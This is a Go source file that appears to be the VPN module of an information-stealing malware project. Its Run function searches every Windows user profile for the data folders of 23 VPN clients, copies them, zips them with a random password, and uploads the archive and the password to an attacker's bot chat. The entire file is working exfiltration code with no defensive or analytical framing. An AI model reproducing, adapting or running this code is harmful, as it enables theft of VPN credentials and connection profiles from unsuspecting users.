package vpn

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"

    "github.com/mmmhlecaca/enori/common"
    "github.com/mmmhlecaca/enori/utils/fileutil"
    "github.com/mmmhlecaca/enori/utils/requests"
)

func Run(botToken, chatId string) {
    vpnPaths := map[string]string{
        "OpenVPN Connect":         "AppData\\Roaming\\OpenVPN Connect\\profiles",
        "Mullvad VPN":             "AppData\\Roaming\\Mullvad VPN",
        "Proton VPN":              "AppData\\Local\\ProtonVPN",
        "Nord VPN":                "AppData\\Local\\NordVPN",
        "Express VPN":             "AppData\\Local\\ExpressVPN",
        "CyberGhost":              "AppData\\Local\\CyberGhost",
        "Surfshark":               "AppData\\Local\\Surfshark",
        "Vypr VPN":                "AppData\\Local\\VyprVPN",
        "Windscribe":              "AppData\\Local\\Windscribe",
        "Hide.me":                 "AppData\\Local\\hide.me VPN",
        "Hotspot Shield":          "AppData\\Local\\Hotspot Shield",
        "TunnelBear":              "AppData\\Local\\TunnelBear",
        "IPVanish":                "AppData\\Local\\IPVanish",
        "HMA":                     "AppData\\Local\\HMA VPN",
        "ZenMate":                 "AppData\\Local\\ZenMate",
        "Pure VPN":                "AppData\\Local\\PureVPN",
        "TorGuard":                "AppData\\Local\\TorGuard",
        "Betternet":               "AppData\\Local\\Betternet",
        "PrivateVPN":              "AppData\\Local\\PrivateVPN",
        "VPN Unlimited":           "AppData\\Local\\VPN Unlimited",
        "Goose VPN":               "AppData\\Local\\GooseVPN",
        "SaferVPN":                "AppData\\Local\\SaferVPN",
        "Private Internet Access": "AppData\\Local\\Private Internet Access",
    }

    vpnsTempDir := filepath.Join(os.TempDir(), "vpns-temp")
    if err := os.MkdirAll(vpnsTempDir, os.ModePerm); err != nil {
        fmt.Println("Error creating temp dir:", err)
        return
    }

    var vpnsFound strings.Builder

    for _, user := range common.GetUsers() {
        for name, relativePath := range vpnPaths {
            rel := filepath.FromSlash(strings.ReplaceAll(relativePath, "\\", "/"))
            vpnsPath := filepath.Join(user, rel)

            if !fileutil.Exists(vpnsPath) || !fileutil.IsDir(vpnsPath) {
                continue
            }

            vpnsDestPath := filepath.Join(vpnsTempDir, filepath.Base(user), name)
            if err := os.MkdirAll(filepath.Dir(vpnsDestPath), os.ModePerm); err != nil {
                continue
            }

            if err := fileutil.CopyDir(vpnsPath, vpnsDestPath); err == nil {
                vpnsFound.WriteString(fmt.Sprintf("\n✅ %s - %s", filepath.Base(user), name))
            }
        }
    }

    if vpnsFound.Len() == 0 {
        return
    }

    vpnsFoundStr := vpnsFound.String()
    if len(vpnsFoundStr) > 4090 {
        vpnsFoundStr = "Numerous vpns to explore."
    }

    vpnsTempZip := filepath.Join(os.TempDir(), "vpns.zip")
    _ = os.Remove(vpnsTempZip)
    defer func() { _ = os.Remove(vpnsTempZip) }()

    password := common.RandString(16)
    if err := fileutil.ZipWithPassword(vpnsTempDir, vpnsTempZip, password); err != nil {
        fmt.Println("Error zipping directory:", err)
        return
    }

    message := fmt.Sprintf("Password: %s\nFounds: %s", password, vpnsFoundStr)
    requests.Upload(botToken, chatId, vpnsTempZip)
    requests.Upload(botToken, chatId, message)
}
